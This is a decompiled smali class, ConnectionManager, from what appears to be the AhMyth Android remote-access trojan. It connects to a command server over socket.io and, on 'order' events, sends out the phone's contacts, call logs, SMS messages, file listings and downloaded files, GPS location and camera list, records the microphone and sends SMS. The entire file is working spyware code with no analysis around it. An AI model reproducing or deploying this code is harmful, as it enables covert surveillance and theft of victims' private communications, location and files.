.class public Lahmyth/mine/king/ahmyth/ConnectionManager;
.super Ljava/lang/Object;
.source "ConnectionManager.java"


# static fields
.field public static context:Landroid/content/Context;

.field private static fm:Lahmyth/mine/king/ahmyth/FileManager;

.field private static ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 21
    new-instance v0, Lahmyth/mine/king/ahmyth/FileManager;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/FileManager;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->fm:Lahmyth/mine/king/ahmyth/FileManager;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 16
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000()Lio/socket/client/Socket;
    .locals 1

    .line 16
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method

.method public static sendReq()V
    .locals 3

    .line 42
    :try_start_0
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_0

    .line 43
    return-void

    .line 45
    :cond_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getInstance()Lahmyth/mine/king/ahmyth/IOSocket;

    move-result-object v0

    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    .line 48
    const-string v1, "ping"

    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$1;

    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$1;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 55
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "order"

    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$2;

    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$2;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 106
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {v0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 112
    goto :goto_0

    .line 108
    :catch_0
    move-exception v0

    .line 110
    .local v0, "ex":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    const-string v2, "error"

    invoke-static {v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 114
    .end local v0    # "ex":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 1
    .param p0, "con"    # Landroid/content/Context;

    .line 26
    :try_start_0
    sput-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    .line 27
    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 30
    goto :goto_0

    .line 28
    :catch_0
    move-exception v0

    .line 29
    .local v0, "ex":Ljava/lang/Exception;
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 32
    .end local v0    # "ex":Ljava/lang/Exception;
    :goto_0
    return-void
.end method

.method public static x0000ca(I)V
    .locals 4
    .param p0, "req"    # I

    .line 118
    const/4 v0, 0x0

    const/4 v1, 0x1

    const/4 v2, -0x1

    if-ne p0, v2, :cond_1

    .line 119
    new-instance v2, Lahmyth/mine/king/ahmyth/CameraManager;

    sget-object v3, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v2, v3}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v2}, Lahmyth/mine/king/ahmyth/CameraManager;->findCameraList()Lorg/json/JSONObject;

    move-result-object v2

    .line 120
    .local v2, "cameraList":Lorg/json/JSONObject;
    if-eqz v2, :cond_0

    .line 121
    sget-object v3, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v1, v1, [Ljava/lang/Object;

    aput-object v2, v1, v0

    const-string v0, "x0000ca"

    invoke-virtual {v3, v0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 122
    .end local v2    # "cameraList":Lorg/json/JSONObject;
    :cond_0
    goto :goto_0

    .line 123
    :cond_1
    if-ne p0, v1, :cond_2

    .line 124
    new-instance v0, Lahmyth/mine/king/ahmyth/CameraManager;

    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v0, v2}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0, v1}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V

    goto :goto_0

    .line 126
    :cond_2
    if-nez p0, :cond_3

    .line 127
    new-instance v1, Lahmyth/mine/king/ahmyth/CameraManager;

    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v0}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V

    .line 130
    :cond_3
    :goto_0
    return-void
.end method

.method public static x0000cl()V
    .locals 4

    .line 150
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "x0000cl"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 151
    return-void
.end method

.method public static x0000cn()V
    .locals 4

    .line 154
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "x0000cn"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 155
    return-void
.end method

.method public static x0000fm(ILjava/lang/String;)V
    .locals 4
    .param p0, "req"    # I
    .param p1, "path"    # Ljava/lang/String;

    .line 133
    const/4 v0, 0x1

    if-nez p0, :cond_0

    .line 134
    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-static {p1}, Lahmyth/mine/king/ahmyth/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    aput-object v3, v0, v2

    const-string v2, "x0000fm"

    invoke-virtual {v1, v2, v0}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    .line 135
    :cond_0
    if-ne p0, v0, :cond_1

    .line 136
    invoke-static {p1}, Lahmyth/mine/king/ahmyth/FileManager;->downloadFile(Ljava/lang/String;)V

    .line 137
    :cond_1
    :goto_0
    return-void
.end method

.method public static x0000lm()V
    .locals 11
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 162
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 163
    new-instance v0, Lahmyth/mine/king/ahmyth/LocManager;

    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lahmyth/mine/king/ahmyth/LocManager;-><init>(Landroid/content/Context;)V

    .line 164
    .local v0, "gps":Lahmyth/mine/king/ahmyth/LocManager;
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 166
    .local v1, "location":Lorg/json/JSONObject;
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->canGetLocation()Z

    move-result v2

    const/4 v3, 0x1

    const/4 v4, 0x0

    const-string v5, "enable"

    if-eqz v2, :cond_0

    .line 168
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->getLatitude()D

    move-result-wide v6

    .line 169
    .local v6, "latitude":D
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->getLongitude()D

    move-result-wide v8

    .line 170
    .local v8, "longitude":D
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v10, "   ,  "

    invoke-virtual {v2, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v8, v9}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v10, "loc"

    invoke-static {v10, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 171
    invoke-virtual {v1, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 172
    const-string v2, "lat"

    invoke-virtual {v1, v2, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 173
    const-string v2, "lng"

    invoke-virtual {v1, v2, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 174
    .end local v6    # "latitude":D
    .end local v8    # "longitude":D
    goto :goto_0

    .line 176
    :cond_0
    invoke-virtual {v1, v5, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 178
    :goto_0
    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v3, v3, [Ljava/lang/Object;

    aput-object v1, v3, v4

    const-string v4, "x0000lm"

    invoke-virtual {v2, v4, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 179
    return-void
.end method

.method public static x0000mc(I)V
    .locals 0
    .param p0, "sec"    # I
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 158
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/MicManager;->startRecording(I)V

    .line 159
    return-void
.end method

.method public static x0000sm(ILjava/lang/String;Ljava/lang/String;)V
    .locals 6
    .param p0, "req"    # I
    .param p1, "phoneNo"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .line 141
    const/4 v0, 0x0

    const-string v1, "x0000sm"

    const/4 v2, 0x1

    if-nez p0, :cond_0

    .line 142
    sget-object v3, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v2, v2, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/SMSManager;->getSMSList()Lorg/json/JSONObject;

    move-result-object v4

    aput-object v4, v2, v0

    invoke-virtual {v3, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0

    .line 143
    :cond_0
    if-ne p0, v2, :cond_1

    .line 144
    invoke-static {p1, p2}, Lahmyth/mine/king/ahmyth/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    .line 145
    .local v3, "isSent":Z
    sget-object v4, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v2, v2, [Ljava/lang/Object;

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v2, v0

    invoke-virtual {v4, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 147
    .end local v3    # "isSent":Z
    :cond_1
    :goto_0
    return-void
.end method
